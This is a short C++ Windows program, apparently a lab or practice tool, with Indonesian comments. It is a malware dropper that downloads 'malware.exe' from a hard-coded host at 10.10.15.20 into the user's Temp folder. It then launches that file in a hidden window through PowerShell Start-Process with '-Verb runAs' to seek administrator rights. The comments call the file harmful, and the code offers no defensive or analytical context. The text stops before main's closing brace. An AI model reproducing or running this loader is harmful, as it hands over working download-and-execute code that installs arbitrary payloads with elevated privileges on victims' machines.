//lowanz

#include <Windows.h>
#include <Urlmon.h>
#include <shlwapi.h>
#include <Stdio.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shlwapi.lib")

int main() {
    LPCWSTR url = L"http://10.10.15.20/malware.exe"; // Masukkan URL
    LPCWSTR path = L"C:\\Users\\alwan\\AppData\\Local\\Temp\\malware.exe"; // path untuk menyimpan file exe berbahaya>

    // download file menggunakan URLDownloadToFileW
    HRESULT hr = URLDownloadToFileW(NULL, url, path, 0, NULL);
    if (hr != S_OK) {
        return -1;
    }

    // menjalankan file unduhan .exe di latar belakang menggunakan CreateProcessW
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    WCHAR cmd[256] = L"powershell.exe -c Start-Process "; // menggunakan powershell.exe untuk memangil Start-Process>
    wcscat_s(cmd, L"\"");
    wcscat_s(cmd, path); // menambahkan path file unduhan ke cmd
    wcscat_s(cmd, L"\" -Verb runAs"); // menambahkan argumen -Verb runAs ke cmd
    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return -1;
    }

    return 0;
